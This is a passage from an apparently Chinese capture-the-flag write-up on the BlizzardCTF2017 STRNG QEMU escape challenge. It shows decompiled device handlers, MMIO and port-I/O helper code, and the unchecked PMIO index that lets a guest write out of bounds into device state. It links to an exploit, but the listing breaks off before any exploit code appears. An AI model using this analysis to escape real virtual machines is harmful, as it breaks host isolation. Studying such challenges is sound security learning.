+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span>00<span class=se>\:</span>03.0/resource
+0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
+0x000000000000c050 0x000000000000c057 0x0000000000040101
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+</code></pre></td></tr></table>
+</div>
+</div><p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags）。</p>
+<p>更多关于PCI的说明可以看这篇文章https://zhuanlan.zhihu.com/p/26244141</p>
+<h2 id=qom>QOM</h2>
+<blockquote>
+<p>QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p>
+<p>由于qemu模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解C++或其它面向对象语言来理解QOM。</p>
+<p>有几个比较关键的结构体，<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。</p>
+</blockquote>
+<p>对于这块的理解，直接读两个简单的例子比较方便。<a href=https://web.archive.org/web/20160413190044/http://ilevex.eu/post/88944209761/how-to-create-a-custom-pci-device-in-qemu>例子1</a> <a href=http://tic-le-polard.blogspot.com/2015/01/emulate-pci-device-with-qemu.html>例子2</a></p>
+<p>进一步可以读读这两篇文章（不太必要，看完我依旧云里雾里的。。）<a href=https://www.binss.me/blog/qemu-note-of-qemu-object-model/>文章一</a> <a href=https://juniorprincewang.github.io/2018/07/23/qemu%E6%BA%90%E7%A0%81%E6%B7%BB%E5%8A%A0%E8%AE%BE%E5%A4%87/>文章二</a></p>
+<h2 id=blizzardctf2017-strng>BlizzardCTF2017-STRNG</h2>
+<p>题目在<a href=https://github.com/rcvalle/blizzardctf2017>repository</a>的release中可以下载到</p>
+<h3 id=debugging>Debugging</h3>
+<p>使用gdbscript</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ cat gdbscript
+aslr off
+
+b strng_instance_init
+b strng_pmio_read
+b strng_pmio_write
+
+run  -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -device e1000,netdev<span class=o>=</span>net0 -netdev user,id<span class=o>=</span>net0,hostfwd<span class=o>=</span>tcp::5555-:22
+$ gdb -q qemu-system-x86_64
+gdb&gt; <span class=nb>source</span> gdbscript
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=mmio>MMIO</h3>
+<h4 id=strng_mmio_read>strng_mmio_read</h4>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>uint64_t</span> <span class=kr>__fastcall</span> <span class=nf>strng_mmio_read</span><span class=p>(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
+<span class=p>{</span>
+  <span class=kt>uint64_t</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
+</span><span class=c1></span>
+  <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
+  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>addr</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>)</span>
+    <span class=n>result</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=n>addr</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>];</span>
+  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>只能读4个字节且"地址"必须4字节对齐，将地址转换成index读取数据。</p>
+<h4 id=strng_mmio_write>strng_mmio_write</h4>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>strng_mmio_write</span><span class=p>(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
+<span class=p>{</span>
+  <span class=n>hwaddr</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// rsi
+</span><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// eax
+</span><span class=c1></span>  <span class=kt>int</span> <span class=n>vala</span><span class=p>;</span> <span class=c1>// [rsp+8h] [rbp-30h]
+</span><span class=c1></span>
+  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>addr</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>)</span>
+  <span class=p>{</span>
+    <span class=n>idx</span> <span class=o>=</span> <span class=n>addr</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>;</span>
+    <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>idx</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span>
+    <span class=p>{</span>
+      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=p>,</span> <span class=n>hwaddr</span><span class=p>,</span> <span class=kt>uint64_t</span><span class=p>))</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>rand</span><span class=p>)(</span><span class=n>opaque</span><span class=p>,</span> <span class=n>idx</span><span class=p>,</span> <span class=n>val</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>idx</span> <span class=o>&lt;</span> <span class=mi>1</span> <span class=p>)</span>
+    <span class=p>{</span>
+      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>srand</span><span class=p>(</span><span class=n>val</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>else</span>
+    <span class=p>{</span>
+      <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>idx</span> <span class=o>==</span> <span class=mi>3</span> <span class=p>)</span>
+      <span class=p>{</span>
+        <span class=n>vala</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+        <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>rand_r</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
+        <span class=n>LODWORD</span><span class=p>(</span><span class=n>val</span><span class=p>)</span> <span class=o>=</span> <span class=n>vala</span><span class=p>;</span>
+        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
+      <span class=p>}</span>
+      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+    <span class=p>}</span>
+  <span class=p>}</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>idx=0时，调用<code>srand(val)</code>设置随机种子</p>
+<p>idx=1时，调用<code>rand()</code>设置随机值到regs[1]</p>
+<p>idx>=3时，将val设置到regs[idx]</p>
+<p>看起来idx没有限制，但是PCI设备会进行内部的检查，因为PCI注册的MMIO空间大小只有256字节。</p>
+<h4 id=编程进行mmio>编程进行MMIO</h4>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>mmio_mem</span><span class=p>;</span>
+
+<span class=kt>void</span> <span class=nf>mmio_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>mmio_mem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>))</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>uint32_t</span> <span class=nf>mmio_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=k>return</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span><span class=o>*</span><span class=p>)</span><span class=n>mmio_mem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>)</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
+<span class=p>{</span>
+    <span class=kt>int</span> <span class=n>mmio_fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/sys/devices/pci0000:00/0000:00:03.0/resource0&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=o>|</span><span class=n>O_SYNC</span><span class=p>);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>mmio_fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+        <span class=n>die</span><span class=p>(</span><span class=s>&#34;open mmio_fd failed&#34;</span><span class=p>);</span>
+    
+    <span class=n>mmio_mem</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>mmio_fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>mmio_mem</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span>
+        <span class=n>die</span><span class=p>(</span><span class=s>&#34;mmap mmio_mem failed&#34;</span><span class=p>)</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=pmio>PMIO</h3>
+<h4 id=strng_pmio_read>strng_pmio_read</h4>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>uint64_t</span> <span class=kr>__fastcall</span> <span class=nf>strng_pmio_read</span><span class=p>(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
+<span class=p>{</span>
+  <span class=kt>uint64_t</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
+</span><span class=c1></span>  <span class=kt>uint32_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// edx
+</span><span class=c1></span>
+  <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
+  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
+  <span class=p>{</span>
+    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=p>)</span>
+    <span class=p>{</span>
+      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
+      <span class=p>{</span>
+        <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>v4</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>)</span>
+          <span class=n>result</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=n>v4</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>];</span>
+      <span class=p>}</span>
+    <span class=p>}</span>
+    <span class=k>else</span>
+    <span class=p>{</span>
+      <span class=n>result</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr</span><span class=p>;</span>
+    <span class=p>}</span>
+  <span class=p>}</span>
+  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里也可以发现，这些函数中的addr，都是起始端口/地址的偏移。</p>
+<p>如果操作号(addr)是0，则读取存储的地址；</p>
+<p>如果操作号是4，则读取地址处的值(regs[addr&#187;2])。</p>
+<h4 id=strng_pmio_write>strng_pmio_write</h4>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>strng_pmio_write</span><span class=p>(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
+<span class=p>{</span>
+  <span class=kt>uint32_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// eax
+</span><span class=c1></span>  <span class=kr>__int64</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// rax
+</span><span class=c1></span>
+  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
+  <span class=p>{</span>
+    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=p>)</span>
+    <span class=p>{</span>
+      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
+      <span class=p>{</span>
+        <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>v4</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>)</span>
+        <span class=p>{</span>
+          <span class=n>idx</span> <span class=o>=</span> <span class=n>v4</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>;</span>
+          <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>idx</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span>
+          <span class=p>{</span>
+            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kt>uint64_t</span><span class=p>))</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>rand</span><span class=p>)(</span><span class=n>opaque</span><span class=p>,</span> <span class=mi>4LL</span><span class=p>,</span> <span class=n>val</span><span class=p>);</span>
+          <span class=p>}</span>
+          <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>idx</span> <span class=o>&lt;</span> <span class=mi>1</span> <span class=p>)</span>
+          <span class=p>{</span>
+            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>srand</span><span class=p>(</span><span class=n>val</span><span class=p>);</span>
+          <span class=p>}</span>
+          <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>idx</span> <span class=o>==</span> <span class=mi>3</span> <span class=p>)</span>
+          <span class=p>{</span>
+            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kt>uint64_t</span><span class=p>))</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>rand_r</span><span class=p>)(</span>
+                                <span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span>
+                                <span class=mi>4LL</span><span class=p>,</span>
+                                <span class=n>val</span><span class=p>);</span>
+          <span class=p>}</span>
+          <span class=k>else</span>
+          <span class=p>{</span>
+            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+          <span class=p>}</span>
+        <span class=p>}</span>
+      <span class=p>}</span>
+    <span class=p>}</span>
+    <span class=k>else</span>
+    <span class=p>{</span>
+      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+    <span class=p>}</span>
+  <span class=p>}</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>操作号为0，则设置地址addr；</p>
+<p>操作号为4，则写入数据。</p>
+<ul>
+<li>
+<p>idx=0，srand设置种子</p>
+</li>
+<li>
+<p>idx=1，regs[1]=rand()</p>
+</li>
+<li>
+<p>idx=3，regs[3]=rand_r(&opaque->regs[2])</p>
+</li>
+<li>
+<p>idx>3，regs[idx]=val</p>
+</li>
+</ul>
+<p>这里看起来有机可乘，没有对PMIO的addr进行检查。</p>
+<h4 id=编程进行pmio>编程进行PMIO</h4>
+<p>使用&lt;sys/io.h>中的outb/inb，outw/inw，outl/inl函数。</p>
+<p>访问相应的端口需要一定的权限，程序应使用root权限执行。对于0x000-0x3ff之间的端口，使用<code>ioperm(from, num turn_on)</code>即可；对于0x3ff以上的端口，应调用<code>iopl(3)</code>去获取权限。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>uint32_t</span> <span class=n>pmio_base</span> <span class=o>=</span> <span class=mh>0xc050</span><span class=p>;</span>
+
+<span class=kt>uint32_t</span> <span class=nf>pmio_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>outl</span><span class=p>(</span><span class=n>value</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>uint32_t</span> <span class=nf>pmio_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=n>inl</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
+<span class=p>{</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>iopl</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
+        <span class=n>die</span><span class=p>(</span><span class=s>&#34;iopl failed&#34;</span><span class=p>);</span>
+    <span class=n>pmio_write</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+    <span class=n>pmio_read</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>4</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=利用>利用</h3>
+<p><a href=https://github.com/clxsh/ctf_wps/tree/master/others/qemu_pwn/BlizzardCTF2017_strng>exp和脚本</a></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
